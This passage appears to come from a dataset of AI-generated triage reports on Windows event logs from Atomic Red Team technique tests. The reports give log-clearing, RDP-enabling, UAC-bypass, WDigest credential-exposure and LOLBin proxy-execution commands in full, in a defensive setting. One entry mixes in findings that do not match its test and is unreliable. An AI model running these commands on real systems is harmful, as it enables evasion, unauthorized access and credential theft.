   - The logs indicate that entries were cleared from the System, Security, and Windows PowerShell event logs using the `wevtutil.exe` command. This is evident from events in the System and Security logs with Event ID 104 in the System log and Event ID 1102 in the Security log. Log clearing can be a sign of malicious activity, as attackers often clear logs to cover their tracks and avoid detection.

2. **Suspicious Commands:**
   - The Sysmon logs show multiple instances of the process `wevtutil.exe` executed with the command line argument `cl` to clear logs (e.g., cl Microsoft-Windows-Sysmon/Operational, cl Application). The execution of `cmd.exe` with a command involving `msiexec.exe` and a custom DLL file also appears in the logs. This specific command line: `""cmd.exe"" /c c:\\windows\\system32\\msiexec.exe /z ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.007\\bin\\MSIRunner.dll""` suggests an attempt to execute code via a malicious DLL which is a known technique for bypassing security mechanisms using legitimate binaries, sometimes referred to as Living Off The Land Binaries (LOLBins).

3. **Use of High Privilege Accounts:**
   - Numerous activities in Sysmon logs are conducted by the user ""SERVER002\\admin_test"" with high integrity levels. The high integrity level signals administrative privileges which, when combined with log clearing, indicates possible privilege misuse.

4. **Edge Update Process:**
   - There are multiple entries for `MicrosoftEdgeUpdate.exe`. However, on their own, these seem like legitimate update processes run as `NT AUTHORITY\SYSTEM` and may align with regular update activities for Microsoft Edge. However, their timing and surrounding context of the account, combined with the presence of multiple suspicious elements, merit close review.

**Assessment and Resolution:**

Given the above analysis, the provided logs contain several signs that suggest potential malicious activities, particularly the log-clearing events coupled with the suspicious command execution involving `msiexec.exe` and a custom DLL. These activities clearly resemble known attack techniques.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

  - Conduct a deeper forensic analysis to unearth other artifacts of compromise, focusing on the timeline when logs were cleared and commands executed.
  - Check other systems for similar events or indicators to determine the scope.

- **Review and Harden Systems:**
  - Assess and review permission levels, especially for users with high privilege access.
  - Apply patches and updates consistently across all systems.
  - Enhance monitoring with more robust alerting mechanisms for such patterns (log clearing, suspicious command usage).

- **Review and Update Policies:**
  - Reinforce security policies, particularly around audit logging and retention, to prevent and detect log tampering.
  - Re-evaluate and update policies around the usage of high-privilege accounts, possibly integrating more rigorous oversight and restrictions on activities permissible for these accounts."
Allow Simultaneous Download Registry,"### Analysis of Windows Event Logs:

The provided logs indicate several activities that warrant close scrutiny to determine if malicious activity occurred:

#### Suspicious and Anomalous Activities Observed:

1. **Event Log Clearing:**
   - Multiple instances of log clearing using `wevtutil.exe` are observed across different event logs (Security, System, Windows PowerShell, etc.). This activity is unusual and typically indicative of an attempt to hide actions or erase evidence, often associated with malicious activity.

2. **Process Creation and Execution:**
   - The `wevtutil.exe` is executed several times, suggesting manual or automated clearing of different log files.
   - Use of `cmd.exe` with a command to modify registry values related to ""MaxConnectionsPerServer"" and ""MaxConnectionsPer1_0Server"". This type of registry modification could be part of a configuration change, but without further context, it is typically suspicious.
   - Use of tools like `whoami.exe` and `hostname.exe` which are common in enumeration activities often seen in post-exploitation phases.

3. **High Integrity Levels:**
   - Many of the processes, e.g., `wevtutil.exe` and `cmd.exe`, are executed with high integrity levels, indicating they run with elevated privileges, which is consistent with malicious activity requiring privilege escalation.

#### Malicious Activity Indicators:

1. **Typical Attack Chain:**
   - Clearing event logs is a known tactic used by attackers post-compromise to cover tracks. The repeated clearing without legitimate reason points to a potential compromise.
   - The execution of command-line utilities and registry modification without clear administrative or operational need indicates potential misuse.

2. **User Account Activity:**
   - The `admin_test` account is utilized in the majority of events, involved in executing potentially harmful actions such as event log clearing and registry changes. This could indicate a compromised administrative account or insider threat.

3. **Parent Process Connections:**
   - Consistent linkage to `wsmprovhost.exe` for parent processes suggests usage of PowerShell or Windows Management Instrumentation (WMI) for potentially illegitimate tasks.

#### Assessment and Resolution:

- **Risk Identification:**
  - The evidence indicates a deliberate attempt to manipulate system configurations, combined with activities generally associated with malicious intent (log clearance, privilege use, registry modification).
  - Given the coordinated timeline of actions and privileged access use, this suggests an active threat or threat actor compromising the system.

#### Guidance and Next Steps:

1. **Resolution: MALICIOUS**
   - This assessment is based on multiple indicators of post-compromise tactics. Log clearance, registry modifications, and unusual process executions collectively suggest malicious activity.

   - **Time Manipulation (Event ID 4616)**: There are recorded instances where the system time was changed (OldTime and NewTime records show a conflict). Unauthorized time changes can be suspicious, although it’s recognized that system time changes may result from legitimate actions.

2. **Sysmon Log Analysis:**
   - **Unusual Execution with Elevated Privileges**: There are several executions of system utilities like `whoami.exe` and `wevtutil.exe` associated with the user `admin_test` and parent process `wsmprovhost.exe`, which could be legitimate if related to administrative scripts but may still need further exploration.
   - **Command Execution with Powershell**: A PowerShell command `set-WebConfigurationProperty` was executed to change IIS logging settings (`-name dontLog -value $true`). This action seems intended to disable logging, a common tactic to hide subsequent malicious activity. Given the context, this is highly suspicious.
   
3. **System Log Analysis:**
   - **Event Log Cleared (Event ID 104)**: The system logs also show that logs for the `Windows PowerShell` channel were cleared by `admin_test`, consistent with attempts to remove traces of PowerShell activity.

4. **Application Log Analysis:**
   - Repeating entries of `edgeupdate` service stopping isn't inherently suspicious but could correlate with attempts to execute something surreptitiously if combined with the actions seen above.

5. **PowerShell Log Analysis:**
   - The command executed was an administrative action on IIS to stop HTTP logging, which is not a default or innocuous administrative task, particularly in the absence of an official change management process.

### Assessment:

The combination of log clearing activities, unauthorized time changes, obscure use of PowerShell to disable logging, and execution of critical system utilities strongly suggest an attempt to hide activity on the host. While some events could potentially be explained by legitimate administrative activity, the specific patterns and tasks (especially modification of IIS logging) align closely with those often seen in compromised systems, where attackers attempt to maintain persistence and hide their tracks by manipulating system configurations and logs.

### Resolution: **MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Incident Response**: Initiate a security incident response process to isolate the system to prevent further potential damage.
2. **Forensic Analysis**: Conduct a more in-depth forensic analysis to track the source of these suspicious actions, including checking for persistence methods and lateral movement.
3. **Monitor User Activity**: Examine `admin_test` account activity. Consider further investigation into any anomalous user behavior.
4. **Patch and Review Configurations**: Ensure all system configurations are restored to secure defaults, and check for vulnerabilities or misconfigurations that enabled this activity.
5. **Enhance Monitoring**: Improve logging and monitoring configurations to ensure similar activities can be quickly detected in the future."
Enforce Smart Card Authentication Through Registry,"Upon reviewing the provided Windows event logs, several occurrences suggest potentially suspicious and potentially malicious activity on the machine. Here's a detailed analysis:

### Analysis of Events:

1. **Frequent Usage of `wevtutil.exe` and `conhost.exe`:**
   - The logs show that `wevtutil.exe` is frequently executed to clear logs for channels such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `""Windows PowerShell""`. The parent process is `wsmprovhost.exe`, which indicates a potential attempt to cover tracks by clearing these logs.
   - `Conhost.exe` is frequently spawned as a child process of `wevtutil.exe`. This is typical when command line operations occur and the console is hidden or minimized during execution.

2. **Clearing of Event Logs (Event ID 104 for System & Event ID 1102 for Security):**
   - These events indicate the logs have been cleared by `admin_test`. While clearing logs isn't inherently malicious, in conjunction with other indicators, this could suggest an attempt to obfuscate malicious activities.

3. **Suspicious Registry Changes:**
   - There's a specific command executed: `cmd.exe` run with a command that modifies the Windows registry to add `scforceoption`, altering system policy which can be indicative of an attacker setting up persistence or adjusting security settings to lower defense mechanisms.

4. **Time Manipulation:**
   - Events related to time changes (Event ID 4616) in the Security log show the system time being reverted. Tampering with system time can be used to mislead investigators and obfuscate the timeline of events, supporting potential malicious activity.

5. **Execution of `whoami.exe`, `hostname.exe`, and other system binaries:**
   - These executions might be part of reconnaissance activities to gather information about the system and logged-in user.

### Assessment:

- **Indicators of Potential Malicious Activity:**
  - Extensive use of `wevtutil.exe` to clear various event logs indicates potential cover-up activities.
  - Registry changes without a clear administrative intent could suggest malicious intent, possibly for persistence or privilege escalation.
  - Time alteration to mask the timeline of logs is a common obfuscation technique used by malware or attackers post-compromise.
  
Given the collection of these activities, these logs reveal a sophisticated set of activities that align more with potentially malicious actions rather than mistake or standard administrative procedures.

### Resolution:

Based on the analysis above, the activity seen in the logs is classified as **MALICIOUS**. The combination of clearing logs, suspicious registry editing, and system time tampering together indicate deliberate actions to hide possibly unauthorized activities on this host.

### Guidance:

- Immediate attention is required to investigate potential intent and magnitude of compromise on *Server002*.
- A forensic analysis should be undertaken on the affected system to recover and analyze file changes, registry settings, and network connections.
- Consider isolating the machine from the network to prevent further malicious activity.
- Review access credentials and logs to ensure no unauthorized access or accounts have been created.
- Based on findings, initiate incident response protocols to mitigate any discovered threats and improve system defenses against similar future attacks."
Decompile Local CHM File,"After an in-depth analysis of the provided Windows event logs, we observe the following activities:

1. **Log Clearing Activity:**
   - Multiple logs have been cleared almost simultaneously:
     - Security log (Event ID 1102) cleared by user `admin_test`.
     - System log (Event ID 104) cleared on channels System, Windows PowerShell.
   - Usage of `wevtutil.exe` clearing logs via command lines like `wevtutil.exe cl <log>`, which indicates an intention to cover tracks often associated with malicious activity.

2. **Unusual Process Executions:**
   - `cmd.exe` is executing suspicious command lines:
     - `cmd.exe /c hh.exe -decompile %%temp%% ""<path>T1218.001.chm""` suggests the use of hh.exe for devious purposes. The reference to ""AtomicRedTeam"" implies a security testing tool or, in some cases, someone attempting to simulate or explore attack techniques using TTP (Tactics Techniques and Procedures).
   - Usage of `wevtutil.exe` by the same user `admin_test` to clear logs, suggesting privilege misuse or escalation.
   - Execution of `MicrosoftEdgeUpdate` related processes as the SYSTEM user appears as expected for system updates. However, it coincides with the log clearing and other suspicious activities executed by the user `admin_test`.

3. **Security Tool Status:**
   - Windows Defender reported as active during this session, implying that no standard security software was disabled during these activities.

### Assessment:
- **Suspicious Behavior**: The simultaneous clearing of multiple event logs without backup is inherently suspicious. This, combined with the execution of various command-line tools associated with specific security testing/deception activities, indicates a high likelihood of an attempt to obfuscate potentially unauthorized actions.
- **Risk Exposure**: The use of administrative privileges to exonerate logs typically indicates potential malicious intent or, at worse, unauthorized security testing activities without due process, representing potential policy violations.

### Resolution:
- **Classification: MALICIOUS**: The combination of event log clearing and the execution of command lines associated with known offensive security actions indicates this behavior is likely of malicious intent, aimed at avoiding detection or mimicking an attack scenario without proper authorization.

### Guidance for Proceeding:
1. **Incident Response**:
   - Immediately investigate the context of these actions. Determine if `admin_test` initiated these actions legitimately for testing purposes under sanction.
   - Isolate the affected system (Server002) to prevent further potential malicious activities.

2. **Review Access Controls**: Ensure that privileges like those executed by `admin_test` are tightly controlled and monitored.

3. **Audit and Forensics**:
   - Retrieve additional contextual data (network logs, history, files accessed) around the timeframe of the incident.
   - Conduct a deeper forensic investigation using unaltered logs if available, and any security appliances monitoring the environment.

4. **Policy Enforcement and Remediation**:
   - Enforce security policies regarding event log management and unauthorized usage of platforms for red-teaming or similar activities without explicit permission.
   - Provide security awareness training on the correct and authorized usage of security testing tools and methods.

5. **Enhance Monitoring and Alerts**:
   - Implement alerts for events like log clearing, potentially suspicious command execution, and elevated process launches."
Setting Shadow key in Registry for RDP Shadowing,"Based on the provided log entries, there are several indicators of suspicious activity that merit attention:

1. **Event Log Clearing**: The logs highlight multiple instances where the `wevtutil.exe` tool was used to clear event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell` logs). This activity is typically associated with malicious behavior as threat actors often clear logs to cover their tracks and hide their actions.

2. **High-Privilege Access and Sensitive Privileges**: The user `admin_test` is consistently associated with high-level privileges including `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, and others as indicated in event 4672. Such a privilege set can be exploited for a variety of malicious purposes, including tampering with security policies and access controls.

3. **Suspicious PowerShell Execution**: The PowerShell logs indicate the execution of scripts that enable certain firewall rules and modify registry settings related to Remote Desktop services, particularly the `shadow` setting. This could potentially be used to facilitate remote control or monitoring of the system in a manner that bypasses user permissions.

4. **Consistent Use of Conhost and Wmiprvse**: The presence of process executions involving `C:\Windows\System32\conhost.exe` and `C:\Windows\System32\wbem\WmiPrvSE.exe` could indicate attempts to use legitimate Windows utilities as a launch point for malicious activities, though the logs for these processes do not inherently indicate direct malicious behavior beyond usage following the clearing of logs.

5. **Cumulate Actions in Short Timeframe**: The sequence of events all occurred within an incredibly short period. Such synchronized activities suggest potential automation, possibly by a script or malware executing pre-planned steps for a targeted operation.

**Assessment and Resolution**:
Considering the evidence collected:

- The use of event log clearing commands (`wevtutil.exe`) in conjunction with privileged access and modifications to Remote Desktop settings is highly indicative of attempts to hide compromised activities.
- The contextual behavior (e.g., privilege escalation events, clearing security logs) alongside the types of high-risk privileges utilized aligns closely with known malicious activity patterns aimed at maintaining persistence and stealth on the host system.

**Resolution**: **MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Isolation**: Isolate the affected host (`Server002`) from the network to prevent further spread or external communications.

2. **Forensic Imaging**: Perform a forensic capture of the entire system to preserve evidence for further analysis, including disk and volatile memory.

3. **Detailed Threat Hunt**: Conduct a thorough investigation to identify any payloads, tools, or additional compromised accounts that may have been used in continuation of these detected patterns.

4. **Audit and Review Access**: Review all usage of privileged accounts and clean up any unauthorized changes, including registry modifications related to Remote Desktop.

5. **Incident Reporting and Review**: Communicate findings and ongoing analysis internally to relevant stakeholders and refine incident response plans based on detected techniques.

6. **Post-incident Analysis and Patching**: Once resolved, it’s essential to patch identified vulnerabilities and reinforce security measures, such as enhanced logging, use of intrusion detection/prevention systems, and user behavior analytics."
UAC Bypass with WSReset Registry Modification,"## Detailed Analysis of the Logs

### Indicators of Malicious Activity

#### Windows PowerShell Logs:
1. **PowerShell Execution with Registry Modification:**
   - The PowerShell logs indicate execution of commands that modify the registry to create a new command under a specific path and set its default value to `cmd.exe /c start cmd.exe`.
   - This behavior is consistent with a technique often used to bypass certain security controls or to execute additional commands with elevated privileges.

2. **Execution of `WSReset.exe`:**
   - `WSReset.exe` is typically used to clear the Windows Store cache. However, in this case, it is executed hidden, potentially to mask further activities or maintain persistence without alerting users.

#### System Logs:
1. **Clearing of Event Logs:**
   - The system log indicates that event logs, including PowerShell and System logs, are being cleared by the user `admin_test`. This is a strong indicator of an attempt to cover tracks, as clearing logs can remove evidence of suspicious or malicious activities.

#### Security Logs:
1. **Logon and Privilege Escalation:**
   - There are successful logon events for the user `admin_test` using NTLM authentication and a privileged logon with elevated privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.). This could indicate lateral movement or escalation of privileges often seen in post-compromise scenarios.

2. **Clearing of Security Event Logs:**
   - Similar to the system logs, the security log is also cleared, suggesting an attempt to remove forensic evidence.

#### Sysmon Logs:
1. **Repeated Usage of `wevtutil`:**
   - Multiple invocations of `wevtutil.exe` can be observed. This tool is often used to manage and delete event logs and can be used maliciously to hide evidence of attacks.
   - The execution of `wevtutil` correlates with the log-clearing events observed in system and security logs.

2. **PowerShell and Command Execution:**
   - A PowerShell process instance is observed initiating potentially suspicious activities, as evidenced by the previous modifications logged in the PowerShell logs.

### Assessment of the Situation
Based on the analysis of the logs, there is strong evidence of activities consistent with malicious behavior. The registry key modifications through PowerShell, clearing of event logs, high-level privilege usage, and systematic execution of processes from known system paths under a high integrity level strongly suggest that the system may have been compromised.

### Threats and Risks Identified
- **Persistence & Privilege Escalation:**
  The malicious registry key modification is a typical persistence technique, and the execution under a high-integrity process hints at possible privilege escalation.
  
- **Data Tampering & Evasion:**
  The clearing of event logs is a critical step in covering tracks post-compromise, indicating possible data tampering or evasion tactics.

### Guidance on How to Proceed
- **Immediate Incident Response:**
  Isolate the affected host (`Server002`) from the network to prevent further spread or communication of potentially malicious activities.
  
- **Forensic Investigation:**
  Capture memory dumps and full disk images for further forensic analysis to identify malicious binaries and potential lateral movement across the network.

- **Review User Accounts:**
  Check for unauthorized or suspicious logins, particularly focusing on the `admin_test` user, and reset credentials or tokens if any anomalies are found.

- **Check for Persistence Mechanisms:**
  Look into autostart entries, scheduled tasks, and services to remove persistence mechanisms established by the attacker.

- **Audit and Monitor:**
  Implement enhanced logging and monitoring to catch further suspicious activities and improve the detection of similar events in the future.

### Resolution
Given the clear indicators of log clearing, advanced PowerShell-based registry modifications, and `wevtutil` invocations, the resolution is classified as:

**MALICIOUS** - Logs contain activity that strongly indicates malicious behavior."
Regsvcs Uninstall Method Call Test,"### Analysis of Logs

The provided logs exhibit several indicators of potentially malicious behavior. Below is a detailed analysis highlighting the most critical elements:

1. **Log Cleared Events**: 
    - **Security Log Cleared**: Event ID 1102 in the Security log indicates that the security log was cleared by user `admin_test` (SID: S-1-5-21-3962163828-2803415714-1403596700-1006). Clearing of logs is a significant indicator of malicious activity as it is often a tactic employed by attackers to cover their tracks.
    - **System and Windows PowerShell Logs Cleared**: Corresponding Event ID 104 in the System log indicates that `admin_test` also cleared the System and Windows PowerShell logs. This further suggests an attempt to obfuscate actions taken on the machine.

2. **Suspicious Command Execution**:
    - **PowerShell Activity**: The script executed through PowerShell includes:
        - Decoding a base64 string and writing content to a file.
        - Compiling a C# code using `csc.exe` to create a DLL.
        - Executing `regsvcs.exe` to register the generated DLL.
    - This behavior is consistent with techniques associated with code injection or running unauthorized code, particularly as it references a known technique identifier (T1218.009).

3. **Process Creation and Execution Chains**:
    - Several processes such as `wevtutil.exe` were used to clear event logs as seen in Sysmon logs which correlates with the clearing events in Security and System logs. 
    - Presence of `regsvcs.exe` as a child process of PowerShell aligns with potential COM hijacking or abuse, contributing to anomaly.

4. **Privileged Operations**:
    - Event ID 4672 indicates the use of elevated privileges (assign primary token, TCB, security privileges) by the `SYSTEM` account, which is typical but in conjunction with other activities, it supports the malicious assessment.

5. **Failed Credential Access Attempts**:
    - Event ID 5379 indicates failed attempts to access credentials via the Microsoft Account Token Broker or Windows Live Token, showing potential lateral movement or credential harvesting attempts that failed due to incorrect authentication.

### Assessment

The activity observed in the logs suggests an orchestrated attempt to execute unauthorized code, cover up the traces, and potentially retrieve sensitive information. The combination of logs being cleared, suspicious scripts executed through PowerShell, and privileged operations aligns with tactics used in sophisticated attacks.

### Resolution

**Resolution: MALICIOUS**

The events combined are indicative of malicious activity. Steps taken should include:
- Isolate the affected host immediately to prevent further spread within the network.
- Conduct a thorough investigation to identify other potentially compromised hosts.
- Review and restrict admin privilege usage, ensuring logs can't be cleared without triggering alerts.
- Set up monitoring for unusual PowerShell and compilation activities.
- Consider rebuilding the host from a known good state to ensure no malicious persistence mechanisms are active."
Rundll32 with desk.cpl,"In reviewing the provided Windows event logs, several areas require attention and analysis to determine the presence of any malicious activities or anomalies:

### System and Security Events:
1. **Event Clearing (Security Log 1102, System Log 104):**
   - There are multiple log clearing events with Event IDs 1102 (Security log) and 104 (System and PowerShell logs) by the user `admin_test`. Frequent clearing of logs, especially security logs, is highly suspicious, as it is a common practice to cover tracks in a malicious activity.

2. **Account Privileges (Security Log 4672):**
   - The user `admin_test` has multiple instances where high privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others, are in use. Such privileges might be exploited by adversaries for privilege escalation and manipulation of system operations and data.

3. **Time Change (Security Log 4616):**
   - There is a slight time change event around log clearing. Manipulating system time could be used to evade monitoring tied to timestamps and can correlate suspiciously with log clearing actions to confuse investigators.

### Sysmon Events:
4. **Unusual Command Execution:**
   - The command `cmd.exe /c copy %%windir%%\\System32\\calc.exe not_an_scr.scr & rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr` is highly suspicious. This command is indicative of creating and executing a malicious screen saver, potentially used to disguise malicious payloads.

5. **Rundll32 Execution:**
   - Executing `rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr` is a known technique used by attackers to execute malicious code under the guise of legitimate Windows processes.

6. **Process Anomalies:**
   - The high frequency of process launch activities, especially `wevtutil.exe` processes initiated by `admin_test`, suggests log manipulation attempts.

### Conclusion:
- The combination of security event log clearing, unusual command executions, privilege escalation, and time manipulations paints a picture consistent with malicious activities. The specific use of `cmd.exe` and `rundll32.exe` in executing a renamed calculator application as a screen saver strongly suggests a potential attempt to bypass security controls and execute unauthorized actions.

### Assessment:
- **Resolution: MALICIOUS**

### Guidance:
1. **Immediate Response:**
   - Conduct a comprehensive investigation around the time frame of suspicious activities.
   - Isolate the affected host from the network to prevent further compromise.
   - Review accounts with privileged access and reset credentials if necessary.

2. **Mitigative Measures:**
   - Implement enhanced monitoring on critical systems and services.
   - Perform malware scans and integrity checks on all relevant system files.
   - Back up critical data for recovery purposes.

3. **Long-term Strategy:**
   - Train administrative users on secure practices regarding event log management.
   - Integrate more robust anomaly detection mechanisms within systems and security monitoring frameworks."
Enable RDP via Registry (fDenyTSConnections),"Based on the analysis of the Windows event logs provided, multiple entries stand out as potentially suspicious:

1. **Log File Clearing**:  
   - The system, security, and PowerShell logs were cleared (""EventID"":""104"", ""1102"") by the user ""admin_test"". Clearing logs is often an indicator of an attempt to cover up potentially malicious or unauthorized activities.

2. **Use of `wevtutil.exe`**:  
   - The Sysmon logs show multiple instances of `wevtutil.exe`, a command-line utility for managing event logs, being used to clear logs. The fact that this was executed by ""admin_test"" and the logs were subsequently cleared correlates with log clearing activity. This use of `wevtutil.exe` to clear logs underlines potential malice.

3. **Registry Modification with Elevated Privileges**:  
   - The entry for running `cmd.exe` with the command `reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f` is significant. This command is used to enable remote desktop connections, which can be a vector for unauthorized remote access.

4. **Edge Update Anomalies**:  
   - Several Edge Update processes (`MicrosoftEdgeUpdate.exe`) are launched with varied command lines such as `/regserver` and `/update`. While Edge updates can regularly occur, the timing alongside log clearing deserves additional scrutiny, especially if not verified as benign system operations.

5. **System Time Change**:
   - A change in system time by `svchost.exe` is logged, without a clear legitimate reason. Changing system time can be part of an evasive maneuver used during malicious activity.

**Conclusion and Recommendation:**
The logs indicate activity consistent with attempts to cover tracks and enable unauthorized access, such as clearing event logs and modifying system registry settings for remote access. These are strong indicators of malicious behavior.

*Resolution: MALICIOUS* 

**Guidance on How to Proceed:**
- Immediately isolate the affected system from the network to prevent further unauthorized access or damage.
- Conduct a thorough forensic analysis to confirm any breach and understand the scope and method.
- Reset passwords for the accounts involved, especially ""admin_test"", and review account permissions.
- Review and strengthen network access controls, possibly implementing stricter firewall rules and additional security monitoring.
- Restore the system from a known clean backup if necessary, and monitor the system closely post-incident for further anomalies."
Indirect Command Execution - forfiles.exe,"Upon analyzing the provided Windows event logs, I have identified a mix of standard system behaviors and one notably suspicious activity:

1. **Log Cleared Event:**
   - The event with `EventID 1102` in the Security log indicates that the security log was cleared. The user `admin_test` was responsible for this action. Clearing event logs is not a common legitimate administrative action unless there is a specific reason to do so, such as forensic log cleanup after malicious activity.

2. **Command Execution:**
   - In the Sysmon logs, there is a `cmd.exe` invocation with a command `""cmd.exe"" /c forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe`. This is suspicious because it uses the `forfiles` command to execute `calc.exe` on files, which could be a tactic to execute unauthorized programs or hide malicious activities within legitimate processes. `calc.exe` itself might be benign, but the method of execution raises concerns.

3. **Windows Defender and Edge Logs:**
   - The application logs show entries of stopping services related to Windows Defender and Edge updates, which are typical system operations. These appear to be part of system updates and software updates for Microsoft Edge, commonly managed by Windows Task Scheduler and are largely benign in the context provided.

4. **Services and System Events:**
   - The processes `wevtutil.exe` show multiple invocations likely related to Event Log operations and `EdgeUpdate` processes seem related to Microsoft's update service for Edge. This aligns with normal software update activities.

5. **Time Change Records:**
   - Several records show time changes, which can be normal, configured automatically by Windows Time Service. These changes do not immediately suggest malicious actions.

**Assessment:**
Given the logs analyzed, the key concern is the clearing of the event logs by `admin_test` and the use of `cmd.exe` with `forfiles` and `calc.exe`. These actions could be indicative of malicious activity or an insider threat attempting to erase traces after unauthorized actions.

**Resolution:** SUSPICIOUS

**Guidance:**
1. Investigate the reason `admin_test` cleared the event logs, and check for any explanations provided by the user or correlating legitimate administrative activity.
2. Conduct a deeper inspection on the usage pattern and creation of `cmd.exe` and actions taken around those event timings to ensure no unauthorized modifications or scripts were deployed.
3. Monitor subsequent actions from the account `admin_test` for any further anomalous behavior.
4. Check for any unauthorized access that may have leveraged legitimate credentials of the `admin_test` account.

It's recommended to consider access to logs and credential practice reviews and further system scrutiny to rule out potential threats."
System Scope COR_PROFILER,"Upon reviewing the provided event logs, the following suspicious and potentially malicious activities have been identified:

1. **Log File Clearance:**
   - Multiple event logs (System, Windows PowerShell, and Security) have been cleared, indicated by Event ID 104 in the system logs, Event ID 1102 in the security logs, and the use of `wevtutil.exe` to clear logs in the Sysmon logs.
   - The log-clearing actions were performed by the `admin_test` user, which is often indicative of an attempt to cover tracks after unauthorized or malicious activity.

2. **Suspicious PowerShell Activity:**
   - There is evidence of PowerShell scripting to create and modify system environment variables related to COR profiling, which involves registry manipulation. The specific DLL path mentioned (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1574.012\bin\T1574.012x64.dll`) suggests the use of known testing and red-teaming tools, potentially imitating or part of a penetration test suite (Atomic Red Team).
   - The PowerShell script attempts to introduce a profiler, which can be a method to achieve persistence or escalate privileges.

3. **Unusual Process Execution:**
   - The use of `wevtutil.exe` to clear logs is corroborated by multiple entries in the Sysmon logs, suggesting a deliberate action to delete critical event logs.
   - The frequency and systemic nature of the log-clearing, combined with PowerShell script executions, indicate coordinated and potentially malicious behavior.

4. **Use of Known Tools/Techniques:**
   - The presence of `AtomicRedTeam` in file paths is a clear indicator that red team or penetration testing tools might be involved, or it's mimicking such actions for malicious purposes.

**Assessment:**
The combination of log clearance, PowerShell manipulation involving specific system environment variables, and the involvement of tools typically used for offensive security research (e.g., AtomicRedTeam) strongly indicate malicious activity. These are classic signs of attempts to conduct operations that evade detection while performing potentially harmful actions on a host.

**Threats/Risks Identified:**
- Potential unauthorized access and escalation of privileges.
- Evasion of detection systems by clearing logs.
- Possible backdoor installation or system manipulation via PowerShell.

**Guidance on How to Proceed:**
- Conduct a full forensic analysis of the affected system to identify any further persistency or backdoors.
- Isolate the affected system from the network to prevent lateral movement or data exfiltration.
- Review and update security policies to detect and alert similar activities, specifically unauthorized PowerShell usage and log clearance.
- Ensure all security patches are up to date and review user permissions to minimize unauthorized access.

**Resolution: MALICIOUS** - The logs contain activity consistent with malicious actions, including log clearance, environment tampering via PowerShell, and known red teaming tool utilization."
WMI Win32_Product Class - Execute Local MSI file with embedded JScript,"Based on the provided logs, here is a detailed analysis of suspicious and potentially malicious activities:

### Indicators of Suspicious Activity

1. **PowerShell Execution**:
   - The repeated use of PowerShell to invoke a CIM method using the `Invoke-CimMethod` cmdlet suggests potentially suspicious activity. The script is installing a package from a path associated with ""AtomicRedTeam"", which is known as a red team auditing tool used for testing security defenses. While this does not inherently signal malicious intent, its context and the source of execution must be scrutinized.

2. **Log Clearing Events**:
   - The logs indicate clearing of not just the System log but also the Security log and PowerShell log using `wevtutil.exe`. The user `admin_test` executed these actions. Clearing logs is a common tactic used by malicious actors to cover their tracks, and the fact it was done across multiple channels in quick succession is highly suspicious.

3. **Sysmon and Event IDs**:
   - `wevtutil.exe` appears frequently in the logs, suggesting it's being used to clear event logs (Event ID 1 and 5 under Sysmon). This corroborates the activity seen in other logs about deleted log files. Additionally, the use of `powershell.exe` and `wevtutil.exe` together often signals attempts to obfuscate or clean up traces of unauthorized activities.

4. **Windows Installer Activity**:
   - As captured in the application log, a Windows Installer operation was observed which corresponds to the potentially suspicious PowerShell activity previously mentioned. It is associated with an install operation using `Invoke-CimMethod`.

5. **Host Observations with `hostname.exe` and `whoami.exe`**:
   - Execution of these utilities indicates enumeration or reconnaissance activity, often used by attackers post-compromise to gather environment information.

### Assessment

The logs collectively show patterns of behavior and tools usage consistent with techniques employed in penetration testing or potentially malicious activities. While the presence of ""AtomicRedTeam"" might suggest this could be an authorized red team exercise, this context is not explicit within the logs.

Given the combination of PowerShell script usage, event log cleaning, and use of system utilities that are common in initial access or persistence techniques, this collection of activities is notably suspicious.

### Conclusion

**Resolution: SUSPICIOUS**

This activity warrants further investigation. In particular:
- Verify whether this is an authorized action (such as a scheduled red team test).
- Conduct a review of the machine's change logs or configuration management databases for authorized changes.
- Examine file system and network logs for corroborating signs of unauthorized access or data exfiltration attempts.
- Check permissions and usage patterns for the `admin_test` account to ensure it is not compromised.

Until confirmation is obtained or additional context becomes clear, treat the system as potentially compromised and ensure monitoring for additional related activities."
Use Powershell to Modify registry to store logon credentials,"Based on the provided Windows event logs, here's a detailed analysis focusing on potential indicators of malicious activity.

### Summary of Findings:

1. **PowerShell Command Execution:**
   - A PowerShell command executed with the line: `Set-ItemProperty -Force -Path  'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name  'UseLogonCredential' -Value '1' -ErrorAction Ignore`. This command modifies the Windows Registry to enable the UseLogonCredential setting for WDigest, which historically is related to credential theft, particularly enabling plaintext password retrieval in memory on older systems.

2. **Clearing of Event Logs:**
   - Multiple event logs, including Sysmon, Windows PowerShell, and Security were cleared (`EventID` 104 for System, PowerShell logs, and `EventID` 1102 for Security). Clearing event logs is a common tactic used by attackers to cover their tracks after conducting suspicious or malicious activities.

3. **High Integrity Level Processes:**
   - Multiple processes executed with a high integrity level by `SERVER002\\admin_test`. These processes include `wevtutil` (for clearing logs), possibly indicating privilege escalation or an attempt to hide activity. The command lines and sequence of `wevtutil.exe` executions suggest an administrative user manually targeting event logs for clearing purposes.

4. **Frequent MicrosoftEdgeUpdate.exe Executions:**
   - Various executions of `MicrosoftEdgeUpdate.exe`, including several with high integrity levels. While these may be legitimate update processes, the frequency and context (such as being run from temporary directories) suggest potential misuse or anomaly in standard update processes.

### Assessment:
Given the observations, there are clear signs of suspicious activities:

- The tampering with the WDigest setting via PowerShell is highly concerning, as it is commonly associated with preparation for credential theft.
- The clearing of multiple critical logs is an immediate red flag, suggesting an effort to obscure activities.
- The pattern of process executions with high integrity levels points to potential misuse of administrative privileges or improper handling of scheduled tasks.

### Recommendation:
